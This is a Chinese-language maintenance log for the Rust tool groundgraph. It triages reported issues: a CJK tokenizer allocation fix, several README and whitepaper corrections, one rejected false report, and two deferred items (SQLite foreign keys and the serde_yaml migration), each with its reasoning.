- 复核：成立。`flush_cjk` 的 `run.windows(2)` 循环对 `out` 无 `reserve`，CJK-heavy 语料（spring/django 中文 body）反复扩容。
- 修复：`fts_text.rs::flush_cjk` 在 `n>=2` 分支顶部 `out.reserve(n - 1)`（`0`/`1` 分支已先匹配，无下溢风险）。行为不变。
- 验证：`fts_text::tests::*`（cjk_runs_become_overlapping_bigrams 等）输出不变全绿。

### 已修复 · 文档

**#131 README 配置示例用废弃的 `treesitter.languages:`**
- 复核：成立。`config.rs` 明确顶级 `languages:` 才是 canonical，`treesitter.languages` 仅在 `languages` 为空时作后备，且 `normalized()` 在 `languages` 存在时清空别名——README 用别名作主示例会误导用户两者同设而"语言凭空消失"。
- 修复：`README.md` / `README.zh-CN.md` 配置示例改为 canonical `languages: - id: rust paths: [crates]`，并加脚注说明 `treesitter.languages` 是向后兼容别名、勿与 `languages:` 同设。

**#147 白皮书自称"31 个 CLI 命令"，实际 33**
- 复核：成立。`main.rs` 的 `Commands` enum 实有 33 个顶级变体（逐一点数）。
- 修复：`docs/whitepaper-zh.md` §0（`groundgraph 二进制(31→33 个子命令)`）与 §3 标题（`31→33 个 CLI 命令`）。

**#149 README "Language support" 表 Docs 行漏 `.rst`/`.adoc`**
- 复核：成立。`config.rs::default_docs_include()` 含 `**/*.rst` 与 `**/*.adoc`，`docs_indexer` 也有 `parse_rst`/`parse_adoc`；README 表只列 `.md/.mdx`，Python(.rst)/JVM(.adoc) 用户会误以为文档不被索引。
- 修复：`README.md` / `README.zh-CN.md` Docs 行改为 `Markdown / RST / AsciiDoc / …`、`.md, .mdx, .rst, .adoc`；配置示例 `docs.include` 同步补齐四扩展名。

**#150 `cargo install --path` 缺 `--locked`，与"reproducible"自相矛盾**
- 复核：成立。仓库提交了 `Cargo.lock` 且 README 强调 pinned/reproducible，但 `cargo install --path` 默认不读 lock，会解析最新兼容依赖。
- 修复：`README.md` / `README.zh-CN.md` 两条 `cargo install` 改为 `cargo install --locked --path …`，并加注释说明理由。

**#148（部分）docs/codegraph-benchmark-and-roadmap.md 仍称"9 门 tree-sitter 语言"**
- 复核：成立。该 roadmap 文档多处称"9 门"，实际广度层已 12 门（C#/Ruby/PHP/Kotlin 已落地）。
- 本轮修复：line 154"断言 9 门 spec 全部 opt-in"已同步为"扩到 13 门 spec"（与 #134 代码改动一致）。
- **延后部分**：该文档同时混有「已退役的 LSP 精度层」「P21/P23 历史里程碑（当时确为 9 门）」「现状能力矩阵」三类陈述，需一次专门的 doc-sync 通盘校正（区分历史与现状），不在本轮一次性重写，仍部分活跃。

### 误报（源码核实）

**#164 `ReviewStatus::parse` 把未知值静默映射 `Some(Pending)`，破坏 CLI 校验**——误报。
- CLI `candidate review` **不接受**自由文本 `--status`，而是 `--accept`/`--reject`/`--needs-changes`/`--pending` 四个互斥布尔 flag（clap `group="verdict"`，`main.rs:1164-1177`），缺省会 `bail!` 报错；拼错的 flag 会被 clap 直接拒绝。issue 描述的 `candidate review --status accpeted` 路径不存在。
- `parse` 的 `_ => Some(Pending)` 兜底仅作用于 **YAML 反序列化** `business_logic.yaml` 的 `status:` 字段，宽松兜底是有意设计且已被测试固定（`business_candidates.rs:651` `parse("garbage") == Some(Pending)`，注释"unknown values land in the safe pending bucket"）。保持现状。

### 按设计（保留，附说明）

**#135 Cargo.toml MSRV `1.89` 与 rust-toolchain `1.96.0` / README 徽章 `rust-1.96` 不一致**——按设计。
- MSRV（`rust-version`，构建下限）与 pinned dev/CI 工具链（`rust-toolchain.toml`）本就是两个不同维度：前者声明"最低能编译的版本"，后者锁定"开发/CI 实际使用的版本"，两者不同是 Rust 生态的标准做法（下游 packager 看 MSRV、贡献者用 pinned）。当前未发现使用 >1.89 才稳定的 API，故 `rust-version = "1.89"` 暂无证据失真。
- 真正可改进的是"缺少文档解释二者关系"——属低优先文档增强（建议 CONTRIBUTING 增一节 + CI 加 `cargo +1.89 check` job），不构成功能缺陷，留作 backlog。

### 延后（成立但需专项，附理由）

**#139 缺 `PRAGMA foreign_keys=ON`（FK 从未生效）**——成立，但延后。
- 现状核实：`lib.rs:100-108` 的 PRAGMA 列表确无 `foreign_keys=ON`；同时 schema（`001_initial.sql`）**未声明任何 FOREIGN KEY**。
- 关键点：SQLite 仅对**已声明的 FK**生效。只加 `PRAGMA foreign_keys=ON` 而无 FK 子句是**纯 no-op**，反而给人"已有 FK 保护"的错觉。要让它有意义必须先做一次 **table-rebuild 迁移**补 `FOREIGN KEY (...) REFERENCES nodes(id) ON DELETE CASCADE`——这会改变删除语义（级联）、且对存量库中已有的悬空行会在重建时失败，属高风险架构改动，需独立设计 + 数据迁移验证。本轮不草率落地，标记为专项延后。

**#70（issues2.md）`serde_yaml = "0.9"` 已废弃**——成立，但延后。
- 现状核实：`Cargo.toml:36` 仍 `serde_yaml = "0.9"`；全工程约 30 个文件 `use serde_yaml`。
- 该 crate 上游已停止维护（建议迁 `serde_yml`）。迁移虽多为机械重命名，但涉及 ~30 文件 + `Cargo.lock` 变更 + 两 crate 间潜在的细微行为/错误信息差异，需作为独立 PR 专门验证（逐文件序列化/反序列化回归），不并入本轮散修。标记为专项延后；breadcrumb 留在 issues2.md。
